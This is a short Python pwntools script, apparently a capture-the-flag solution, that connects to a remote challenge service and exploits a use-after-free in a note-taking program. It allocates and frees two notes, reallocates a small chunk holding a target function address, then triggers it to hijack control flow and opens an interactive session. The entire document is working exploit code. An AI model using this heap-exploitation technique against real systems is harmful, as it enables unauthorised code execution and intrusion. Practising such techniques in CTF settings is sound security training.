#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = 'csie.ctf.tw'
port = 10137
magic = 0x400c23
r = remote(host, port)
def add_note(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

add_note(0x80, "AAAA")
add_note(0x80, "BBBB")
del_note(1)
del_note(0)
add_note(0x10, p64(magic))
print_note(1)
r.interactive()
